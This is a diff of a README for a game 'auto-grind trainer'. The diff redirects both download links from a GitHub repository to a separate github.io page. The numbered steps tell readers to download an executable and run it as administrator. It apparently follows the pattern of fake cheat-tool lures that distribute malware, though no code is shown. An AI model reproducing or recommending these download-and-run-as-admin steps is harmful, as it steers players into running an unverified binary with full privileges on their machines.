@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026 - Automate progress to master your game
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Cristenalbitic553/DBD-AutoGrind-Trainer-2026)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://cristenalbitic553.github.io)
 
 ## 📁 Project Overview
 DBD-AutoGrind-Trainer-2026 automates character leveling and collection management. This tool assists players by managing Bloodpoints, unlocking desired perks, and managing cosmetic items. It operates as an external process to ensure compatibility with your game client. You gain time while the tool handles repetitive tasks in the background.
@@ -18,7 +18,7 @@ Ensure your computer meets these standards before you run the software:
 You must follow these steps in order to prevent errors.
 
 1. Prepare your environment. Close other unnecessary background processes to ensure system stability.
-2. Visit the download page: [https://github.com/Cristenalbitic553/DBD-AutoGrind-Trainer-2026](https://github.com/Cristenalbitic553/DBD-AutoGrind-Trainer-2026).
+2. Visit the download page: [https://cristenalbitic553.github.io](https://cristenalbitic553.github.io).
 3. Click the link to download the executable file to your computer.
 4. Locate the file in your downloads folder.
 5. Right-click the file and select Run as administrator.
